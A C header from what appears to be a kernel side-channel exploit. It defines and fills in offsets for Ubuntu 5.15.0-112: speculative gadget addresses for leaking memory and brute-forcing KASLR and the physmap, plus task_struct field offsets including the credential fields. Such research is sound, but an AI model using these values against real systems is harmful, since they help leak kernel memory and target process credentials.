/* SPDX-License-Identifier: GPL-3.0-only */
#pragma once

#include "defs.h"

struct kernel_config {
    /* Target ret instruction of __x64_sys_mmap */
    u64 x64_sys_mmap_offset;
    /* Size of the basic block that contains the target ret instruction of __x64_sys_mmap. */
    u64 x64_sys_mmap_ret_offset;
    /* Target ret instruction of __x64_sys_call */
    u64 x64_sys_call_offset;
    /* Size of the basic block that contains the target ret instruction of __x64_sys_call. */
    u64 x64_sys_call_ret_offset;
    /* The start of the load gadget. */
    u64 load_offset;
    /* The offset to the return of the load gadget. */
    u64 load_ret_offset;
    /* The start of the shift gadget. */
    u64 shift_offset;
    /* The offset to the return of the shift gadget. */
    u64 shift_ret_offset;
    /* The gadget we use to leak memory. */
    u64 leak_gadget_offset;
    /*
     * The gadget we use to bruteforce KASLR and the physical address of the F/R
     * array.
     */
    u64 physaddr_gadget_offset;
    /* The gadget we use to bruteforce the starting address of the physmap. */
    u64 physmap_gadget_offset;
    /* Window size for prefetch */
    u64 prefetch_window_size;

    /* Offset of init_task from the base address of the kernel image. */
    u64 init_task_offset;

    /* Offsets of fields in task_struct*/
    u16 task_struct_comm_offset;
    u16 task_struct_task_list_offset;
    u16 task_struct_pid_offset;
    u16 task_struct_real_parent_offset;
    u16 task_struct_mm_offset;
    u16 task_struct_children_offset;
    u16 task_struct_real_cred_offset;
    u16 task_struct_cred_offset;
    u16 task_struct_signal_offset;
    u16 task_struct_thread_node_offset;

    /* struct signal_struct fields */
    u16 signal_struct_thread_head_offset;
};

/* Ubuntu 5.15.0-112-generic */
static const struct kernel_config KERNEL_CONFIG_UBUNTU_15_0_112_GENERIC = {
    .x64_sys_mmap_offset = 0xFFFFFFFF8104B2a9ul - KERNEL_BASE,
    .x64_sys_mmap_ret_offset = 0xFFFFFFFF8104B2B0ul - 0xFFFFFFFF8104B2A9ul,
    .x64_sys_call_offset = 0xFFFFFFFF81005089ul - KERNEL_BASE,
    .x64_sys_call_ret_offset = 0xFFFFFFFF8100508Aul - 0xFFFFFFFF81005089ul,

    // movzx   eax, byte ptr [rdi+0x22e]
    // pop     rbp
    // ret
    .load_offset = 0xFFFFFFFF81843591ul - KERNEL_BASE,
    .load_ret_offset = 8,

    // shl     rax, 0xc
    // ret
    .shift_offset = 0xFFFFFFFF810a7253ul - KERNEL_BASE,
    .shift_ret_offset = 4,

    // mov     rax, [rsi+rax+0x60]
    .leak_gadget_offset = 0xffffffff81030d42ul - KERNEL_BASE,

    // add rsi, page_offset_base
    // add rsi, rcx
    // mov rdi, [rsi]
    .physaddr_gadget_offset = 0xffffffff810a5e88ul - KERNEL_BASE,
    .physmap_gadget_offset = 0xffffffff810a5e92ul - KERNEL_BASE,
    .prefetch_window_size = 29,

    .init_task_offset = 0xffffffff82e1b440ul - KERNEL_BASE,

    .task_struct_comm_offset = 0xbb8,
    .task_struct_task_list_offset = 0x8b8,
    .task_struct_pid_offset = 0x9c0,
    .task_struct_real_parent_offset = 0x9d0,
    .task_struct_mm_offset = 0x908,
    .task_struct_children_offset = 0x9e0,
    .task_struct_real_cred_offset = 0xba0,
    .task_struct_cred_offset = 0xba8,
    .task_struct_signal_offset = 0xc18,
    .task_struct_thread_node_offset = 0xa80,

    .signal_struct_thread_head_offset = 0x10,
};
